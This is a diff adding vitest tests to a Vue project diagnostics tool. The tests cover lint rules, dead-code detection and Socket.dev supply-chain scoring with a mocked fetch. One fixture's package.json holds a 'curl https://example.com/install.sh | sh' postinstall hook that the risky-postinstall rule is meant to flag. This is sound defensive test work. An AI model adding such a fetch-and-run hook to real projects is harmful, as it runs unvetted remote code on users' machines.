@@ -1,10 +1,11 @@
 import fs from "node:fs";
 import os from "node:os";
 import path from "node:path";
-import { afterEach, describe, expect, it } from "vitest";
+import { afterEach, describe, expect, it, vi } from "vitest";
 import { diagnose, toJsonReport } from "../src/index.js";
 
 const tempRoots: string[] = [];
+const originalFetch = globalThis.fetch;
 
 const makeProject = (files: Record<string, string>): string => {
   const root = fs.mkdtempSync(path.join(os.tmpdir(), "vue-doctor-"));
@@ -51,6 +52,8 @@ const makeRawProject = (packageJson: unknown, files: Record<string, string>): st
 };
 
 afterEach(() => {
+  globalThis.fetch = originalFetch;
+  vi.restoreAllMocks();
   for (const root of tempRoots.splice(0)) {
     fs.rmSync(root, { recursive: true, force: true });
   }
@@ -372,6 +375,233 @@ import * as monaco from 'monaco-editor'
     expect(rules).toContain("no-z-index-9999");
     expect(rules).toContain("no-pure-black-background");
     expect(rules).toContain("no-gradient-text");
+  });
+
+  it("detects Vue performance, accessibility, public env, and package health issues", async () => {
+    const root = makeRawProject(
+      {
+        name: "fixture",
+        packageManager: "pnpm@10.0.0",
+        scripts: {
+          postinstall: "curl https://example.com/install.sh | sh",
+        },
+        dependencies: {
+          vue: "^3.5.0",
+          vite: "^7.0.0",
+        },
+      },
+      {
+        "package-lock.json": "{}\n",
+        "pnpm-lock.yaml": "lockfileVersion: '9.0'\n",
+        "src/App.vue": `
+<template>
+  <FancyCard :options="{ dense: true }" :formatter="(value) => value" />
+  <div @click="toggle">Open</div>
+  <input id="email" />
+</template>
+<script setup>
+import { computed, ref, watch } from 'vue'
+const source = ref(0)
+const token = import.meta.env.VITE_API_TOKEN
+const asyncValue = computed(async () => token)
+watch(source, () => {}, { flush: 'sync' })
+</script>
+`,
+      },
+    );
+
+    const result = await diagnose(root);
+    const rules = result.diagnostics.map((diagnostic) => diagnostic.rule);
+
+    expect(rules).toContain("no-risky-postinstall");
+    expect(rules).toContain("no-mixed-lockfiles");
+    expect(rules).toContain("package-manager-lockfile-mismatch");
+    expect(rules).toContain("no-inline-template-object");
+    expect(rules).toContain("no-inline-template-function");
+    expect(rules).toContain("no-click-without-keyboard");
+    expect(rules).toContain("require-form-control-label");
+    expect(rules).toContain("no-public-env-secret");
+    expect(rules).toContain("no-async-computed");
+    expect(rules).toContain("no-sync-watch-flush");
+  });
+
+  it("can hide warning diagnostics while keeping errors", async () => {
+    const root = makeProject({
+      "src/App.vue": `
+<template>
+  <section>
+    <img src="/logo.png">
+    <p v-html="html"></p>
+  </section>
+</template>
+`,
+    });
+
+    const result = await diagnose(root, { config: { warnings: false } });
+
+    expect(result.diagnostics.map((diagnostic) => diagnostic.rule)).toEqual(["no-v-html"]);
+  });
+
+  it("detects dead code through the Vue import graph", async () => {
+    const root = makeRawProject(
+      {
+        name: "fixture",
+        dependencies: {
+          vue: "^3.5.0",
+          vite: "^7.0.0",
+          primeicons: "^7.0.0",
+          "unused-runtime": "^1.0.0",
+        },
+      },
+      {
+        "index.html": "<script type=\"module\" src=\"/src/main.js\"></script>\n",
+        "src/main.js": `
+import { used } from './used'
+import './cycle-a'
+import './assets/styles.scss'
+const LazyView = () => import('@/views/Lazy.vue')
+import.meta.glob('./views/*.vue')
+console.log(used, LazyView)
+`,
+        "src/used.js": `
+export const used = 1
+export const unused = 2
+`,
+        "src/cycle-a.js": "import './cycle-b'\n",
+        "src/cycle-b.js": "import './cycle-a'\n",
+        "src/dead.js": "export const dead = true\n",
+        "src/assets/styles.scss": "@import 'primeicons/primeicons.css';\n",
+        "src/views/Home.vue": "<template><p>Home</p></template>\n",
+        "src/views/Lazy.vue": "<template><p>Lazy</p></template>\n",
+      },
+    );
+
+    const result = await diagnose(root);
+    const rules = result.diagnostics.map((diagnostic) => diagnostic.rule);
+
+    expect(rules).toContain("no-unused-file");
+    expect(rules).toContain("no-unused-export");
+    expect(rules).toContain("no-circular-import");
+    expect(rules).toContain("no-unused-dependency");
+    expect(result.diagnostics.some((diagnostic) => diagnostic.message.includes("primeicons"))).toBe(false);
+    expect(
+      result.diagnostics.some(
+        (diagnostic) =>
+          diagnostic.rule === "no-unused-file" &&
+          (diagnostic.relativePath === "src/views/Home.vue" ||
+            diagnostic.relativePath === "src/views/Lazy.vue"),
+      ),
+    ).toBe(false);
+  });
+
+  it("can disable dead-code analysis", async () => {
+    const root = makeRawProject(
+      {
+        name: "fixture",
+        dependencies: {
+          vue: "^3.5.0",
+          vite: "^7.0.0",
+          "unused-runtime": "^1.0.0",
+        },
+      },
+      {
+        "index.html": "<script type=\"module\" src=\"/src/main.js\"></script>\n",
+        "src/main.js": "console.log('ok')\n",
+        "src/dead.js": "export const dead = true\n",
+      },
+    );
+
+    const result = await diagnose(root, { config: { deadCode: false } });
+
+    expect(result.diagnostics.map((diagnostic) => diagnostic.rule)).not.toContain("no-unused-file");
+    expect(result.diagnostics.map((diagnostic) => diagnostic.rule)).not.toContain("no-unused-dependency");
+  });
+
+  it("detects low Socket.dev supply-chain security scores", async () => {
+    const root = makeRawProject(
+      {
+        name: "fixture",
+        dependencies: {
+          vue: "^3.5.0",
+          "event-stream": "^3.3.6",
+        },
+        devDependencies: {
+          "dev-risk": "^1.0.0",
+        },
+      },
+      {
+        "src/App.vue": "<template><p>ok</p></template>\n",
+      },
+    );
+    const highScore = {
+      overall: 1,
+      license: 1,
+      maintenance: 1,
+      quality: 1,
+      supplyChain: 1,
+      vulnerability: 1,
+    };
+    const lowScore = {
+      ...highScore,
+      overall: 0.2,
+      supplyChain: 0.2,
+    };
+    const fetchMock = vi.fn(async (input: unknown) => {
+      const url = String(input);
+      const score = url.includes("event-stream") ? lowScore : highScore;
+      return new Response(`${JSON.stringify({ score, alerts: [] })}\n`, { status: 200 });
+    });
+    globalThis.fetch = fetchMock;
+
+    const result = await diagnose(root, {
+      config: {
+        deadCode: false,
+        supplyChain: {
+          enabled: true,
+          cache: false,
+          includeDevDependencies: false,
+          severity: "warning",
+        },
+      },
+    });
+    const diagnostic = result.diagnostics.find((entry) => entry.rule === "low-supply-chain-score");
+
+    expect(diagnostic?.severity).toBe("warning");
+    expect(diagnostic?.message).toContain("event-stream@3.3.6");
+    expect(fetchMock).toHaveBeenCalled();
+    expect(fetchMock.mock.calls.some((call) => String(call[0]).includes("dev-risk"))).toBe(false);
+  });
+
+  it("fails open when supply-chain scoring cannot reach Socket.dev", async () => {
+    const root = makeRawProject(
+      {
+        name: "fixture",
+        dependencies: {
+          vue: "^3.5.0",
+          "network-risk": "^1.0.0",
+        },
+      },
+      {
+        "src/App.vue": "<template><p>ok</p></template>\n",
+      },
+    );
+    globalThis.fetch = vi.fn(async () => {
+      throw new Error("network down");
+    });
+
+    const result = await diagnose(root, {
+      config: {
+        deadCode: false,
+        supplyChain: {
+          enabled: true,
+          cache: false,
+          totalTimeoutMs: 50,
+          timeoutMs: 25,
+        },
+      },
+    });
+
+    expect(result.diagnostics.map((diagnostic) => diagnostic.rule)).not.toContain("low-supply-chain-score");
   });
 
   it("detects Vue and Nuxt-specific runtime risks", async () => {
